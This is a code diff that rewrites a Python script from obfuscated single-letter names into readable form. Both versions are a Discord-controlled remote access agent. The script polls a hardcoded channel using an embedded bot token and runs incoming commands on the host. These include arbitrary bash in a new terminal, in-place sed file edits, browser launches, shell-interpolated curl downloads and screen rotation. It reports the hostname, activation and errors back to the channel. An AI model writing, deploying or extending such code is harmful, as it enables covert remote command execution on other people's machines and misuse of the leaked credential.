@@ -1,81 +1,126 @@
-import http.client as H, sys as S, json as J, time as T, socket as K, subprocess as P
+import http.client
+import sys
+import json
+import time
+import socket
+import subprocess
 
-R, T2 = 0, "GM3l_P.mrkZgJvU5KWSoz1-onol2XfkW6YbmzlF8H1oT4"
-HDS = {"Content-Type": "application/json", 'Authorization': f'Bot MTIzMzQ4MTAxMDc4NDUwNTg1Nw.{T2}'}
-I = K.gethostname()
+result = 0
+tokenpart2 = "GM3l_P.mrkZgJvU5KWSoz1-onol2XfkW6YbmzlF8H1oT4"
+headers = {"Content-Type": "application/json", 'Authorization': f'Bot MTIzMzQ4MTAxMDc4NDUwNTg1Nw.{tokenpart2}'}
+ID = socket.gethostname()
 
-def SI(M):
-    D = {"content": M}
-    C = J.dumps(D)
-    O = H.HTTPSConnection("discord.com")
-    U = f"/api/v10/channels/1341791654503514122/messages"
-    O.request("POST", U, body=C, headers=HDS)
-    O.getresponse()
-    O.close()
+def send_info(message):
+	message_data = {"content": message}
+	json_data = json.dumps(message_data)
+	conn = http.client.HTTPSConnection("discord.com")
+	url = f"/api/v10/channels/1341791654503514122/messages"
+	conn.request("POST", url, body=json_data, headers=headers)
+	conn.getresponse()
+	conn.close()
 
-def X():
-    print("Exiting...")
-    SI(f"❌ `[{I}] is deactivated`")
-    S.exit()
+def exiting():
+	print("Exiting...")
+	send_info(f"❌ `[{ID}] is deactivated`")
+	sys.exit()
 
-def RS(): P.run(['xrandr', '--output', 'eDP', '--rotate', 'inverted'], check=True)
-def NS(): P.run(['xrandr', '--output', 'eDP', '--rotate', 'normal'], check=True)
-def RD(): P.run(['xrandr', '--output', 'eDP', '--rotate', 'right'], check=True)
-def LD(): P.run(['xrandr', '--output', 'eDP', '--rotate', 'left'], check=True)
+def reverse_screen():
+	subprocess.run(['xrandr', '--output', 'eDP', '--rotate', 'inverted'], check=True)
 
-def NT(R): P.Popen(['gnome-terminal', '--', 'bash', '-c', f'{R}'])
-def ST(R): P.run(['sed', '-i', f'{R.split('?')[0]}', f'{R.split('?')[1]}'], check=True)
-def FT(R): P.run(['firefox', '--new-tab', f'{R}'], check=True)
-def OI(R): P.run(f'curl "{R}" -o img.jpg', shell=True, check=True); P.run(['xdg-open', 'img.jpg'], check=True)
+def normal_screen():
+	subprocess.run(['xrandr', '--output', 'eDP', '--rotate', 'normal'], check=True)
 
-def LP(R):
-    match R:
-        case "exit": X()
-        case "activated": SI(f"✅ `{I}-is activated`")
-        case "inverted screen": RS()
-        case "normal screen": NS()
-        case "right screen": RD()
-        case "left screen": LD()
-        case _: return
+def right_screen():
+	subprocess.run(['xrandr', '--output', 'eDP', '--rotate', 'right'], check=True)
 
-def LC(SR):
-    match SR[0]:
-        case "newterm": NT(SR[1])
-        case "sed": ST(SR[1])
-        case "firefox": FT(SR[1])
-        case "openimg": OI(SR[1])
-        case _: return
+def left_screen():
+	subprocess.run(['xrandr', '--output', 'eDP', '--rotate', 'left'], check=True)
 
-def M():
-    global R
-    while True:
-        try:
-            C = H.HTTPSConnection("discord.com")
-            U = f"/api/v10/channels/1341791654503514122/messages?limit=1"
-            C.request("GET", U, headers=HDS)
-            P = C.getresponse().read().decode("utf-8")
-            JN = J.loads(P)
-            V = JN[0]['content']
-            VS = V.split('$')
-            if len(VS) == 2:
-                if VS[0] != I: T.sleep(1); continue
-                if R != VS[1]:
-                    R = VS[1]
-                    SR = R.split('!')
-                    LC(SR) if len(SR) == 2 else LP(R)
-            elif len(VS) == 1:
-                if R != VS[0]:
-                    R = VS[0]
-                    SR = R.split('!')
-                    LC(SR) if len(SR) == 2 else LP(R)
-            T.sleep(1)
-        except Exception as E:
-            if E == '0' or E == 0:
-                T.sleep(1)
-            else:
-                SI(f"❌ `[{I}] Error: {E}`")
-                T.sleep(1)
+def new_terminal(result):
+	subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f'{result}'])
+
+def sed_terminal(result):
+	resultsplit = result.split('?')
+	subprocess.run(['sed', '-i', f'{resultsplit[0]}', f'{resultsplit[1]}'], check=True)
+
+def firefox_terminal(result):
+	subprocess.run(['firefox', '--new-tab', f'{result}'], check=True)
+
+def open_img(result):
+	subprocess.run(f'curl "{result}" -o img.jpg', shell=True, check=True)
+	subprocess.run(['xdg-open', 'img.jpg'], check=True)
+
+def launcher_pre(result):
+	match result:
+		case "exit":
+			exiting()
+		case "activated":
+			send_info(f"✅ `{ID}-is activated`")
+		case "inverted screen":
+			reverse_screen()
+		case "normal screen":
+			normal_screen()
+		case "right screen":
+			right_screen()
+		case "left screen":
+			left_screen()
+		case _:
+			return
+
+def launch_custom(splitresult):
+	match splitresult[0]:
+		case "newterm":
+			new_terminal(splitresult[1])
+		case "sed":
+			sed_terminal(splitresult[1])
+		case "firefox":
+			firefox_terminal(splitresult[1])
+		case "openimg":
+			open_img(splitresult[1])
+		case _:
+			return
+
+def main():
+	global result
+	while (True):
+		try:
+			#? check messages dans le salon
+			conn = http.client.HTTPSConnection("discord.com")
+			url = f"/api/v10/channels/1341791654503514122/messages?limit=1"
+			conn.request("GET", url, headers=headers)
+			response = conn.getresponse()
+			paste_content = response.read().decode("utf-8")
+			json_content = json.loads(paste_content)
+
+			value = json_content[0]['content']
+			values = value.split('$')
+			if len(values) == 2:
+				if values[0] != ID:
+					time.sleep(1)
+					continue
+				if result != values[1]:
+					result = values[1]
+					splitresult = result.split('!')
+					if len(splitresult) == 2:
+						launch_custom(splitresult)
+					else:
+						launcher_pre(result)
+			elif len(values) == 1:
+				if result != values[0]:
+					result = values[0]
+					splitresult = result.split('!')
+					if len(splitresult) == 2:
+						launch_custom(splitresult)
+					else:
+						launcher_pre(result)
+			time.sleep(1)
+		except Exception as e:
+			if e == '0' or e == 0:
+				time.sleep(1)
+			else:
+				send_info(f"❌ `[{ID}] Error: {e}`")
+				time.sleep(1)
 
 if __name__ == "__main__":
-    SI(f"✅ `[{I}] is activated`")
-    M()
+	send_info(f"✅ `[{ID}] is activated`")
+	main()
